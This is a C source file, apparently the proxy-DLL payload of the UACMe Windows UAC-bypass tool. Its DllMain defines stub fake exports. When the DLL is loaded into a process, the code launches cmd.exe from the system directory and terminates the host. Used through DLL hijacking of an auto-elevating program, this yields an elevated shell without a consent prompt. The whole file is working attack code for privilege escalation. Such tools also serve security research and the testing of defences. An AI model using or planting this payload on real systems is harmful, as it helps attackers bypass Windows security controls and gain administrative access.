/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     1.50
*
*  DATE:        05 Apr 2015
*
*  Proxy dll entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include <Windows.h>
#include "..\Shared\minirtl.h"

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
	VOID
	)
{
}

/*
* DllMain
*
* Purpose:
*
* Proxy dll entry point, start cmd.exe and exit immediatelly.
*
*/
BOOL WINAPI DllMain(
	_In_ HINSTANCE hinstDLL,
	_In_ DWORD fdwReason,
	_In_ LPVOID lpvReserved
	)
{
	DWORD					cch;
	TCHAR					cmdbuf[MAX_PATH * 2], sysdir[MAX_PATH + 1];
	STARTUPINFO				startupInfo;
	PROCESS_INFORMATION		processInfo;

	UNREFERENCED_PARAMETER(hinstDLL);
	UNREFERENCED_PARAMETER(lpvReserved);

	if (fdwReason == DLL_PROCESS_ATTACH) {
		OutputDebugString(TEXT("UACMe injected, Fubuki at your service.\r\n"));

		RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
		RtlSecureZeroMemory(&processInfo, sizeof(processInfo));
		startupInfo.cb = sizeof(startupInfo);
		GetStartupInfo(&startupInfo);

		RtlSecureZeroMemory(sysdir, sizeof(sysdir));
		cch = ExpandEnvironmentStrings(TEXT("%systemroot%\\system32\\"), sysdir, MAX_PATH);
		if ((cch != 0) && (cch < MAX_PATH)) {
			RtlSecureZeroMemory(cmdbuf, sizeof(cmdbuf));
			_strcpy(cmdbuf, sysdir);
			_strcat(cmdbuf, TEXT("cmd.exe"));

			if (CreateProcess(cmdbuf, NULL, NULL, NULL, FALSE, 0, NULL,
				sysdir, &startupInfo, &processInfo))
			{
				CloseHandle(processInfo.hProcess);
				CloseHandle(processInfo.hThread);
			}
		}
		ExitProcess(0);
	}
	return TRUE;
}
